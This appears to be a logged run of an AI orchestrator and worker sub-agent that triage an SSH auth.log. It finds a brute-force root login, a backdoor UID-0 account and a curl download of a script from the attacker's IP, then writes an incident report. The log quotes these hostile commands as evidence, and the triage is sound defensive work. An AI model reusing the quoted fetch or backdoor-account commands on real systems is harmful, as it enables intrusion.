@@ -1,0 +1,41 @@
+
+--- [Step 1/6] input tokens: 326 ---
+  -> [Tool Call] delegate_log_triage_agent({"filename": "auth.log"})
+
+  ====== [worker sub-agent starts] ======
+
+--- [Step 1/10] input tokens: 554 ---
+  -> [Tool Call] count_by_ip({"pattern": "Failed password"})
+  <- [Tool Output] [["198.51.100.77", 30], ["203.0.113.139", 4], ["203.0.113.115", 4], ["203.0.113.207", 4], ["203.0.113.66", 4], ["203.0.113.214", 3], ["203.0.113.137", 3], ["203
+  -> [Tool Call] grep_log({"pattern": "Accepted password"})
+  <- [Tool Output] 1 matching lines. Showing 1:
+2026-11-05 01:12:00 srv-auth-01 sshd[7100]: Accepted password for root from 198.51.100.77 port 41031 ssh2
+  -> [Tool Call] grep_log({"pattern": "useradd|UID=0"})
+  <- [Tool Output] 1 matching lines. Showing 1:
+2026-11-05 01:10:46 srv-auth-01 useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash
+  -> [Tool Call] grep_log({"pattern": "curl|wget"})
+  <- [Tool Output] 1 matching lines. Showing 1:
+2026-11-05 01:07:36 srv-auth-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh
+
+--- [Step 2/10] input tokens: 1,086 ---
+  -> [Tool Call] grep_log({"pattern": "198\\.51\\.100\\.77"})
+  <- [Tool Output] 32 matching lines. Showing 20:
+2026-11-05 01:05:57 srv-auth-01 sshd[7000]: Failed password for root from 198.51.100.77 port 41000 ssh2
+2026-11-05 01:06:07 srv-a
+
+--- [Step 3/10] input tokens: 2,415 ---
+  ====== [worker sub-agent ends: done, 3 steps] ======
+
+  <- [Tool Output] {"severity":"HIGH","is_compromised":true,"attacker_ips":["198.51.100.77"],"evidence":["2026-11-05 01:05:57 srv-auth-01 sshd[7000]: Failed password for root from
+
+--- [Step 2/6] input tokens: 731 ---
+  -> [Tool Call] write_incident_report({"markdown_report": "# Incident Report: Unauthorized Access & Compromise (auth.log)\n\n## Executive Summary\nAn analysis of `auth.log` revealed a successful brute-force attack followed by full system )
+  <- [Tool Output] SUCCESS: report saved to 'incident_report.md'.
+
+--- [Step 3/6] input tokens: 1,204 ---
+
+[Orchestrator] (done) The incident report has been successfully generated and saved to 'incident_report.md'.
+
+| mode | orchestrator input tokens per step | orchestrator total | worker total | grand total |
+|---|---|---|---|---|
+| subagent | [326, 731, 1204] | 2,261 | 4,455 | 6,716 |
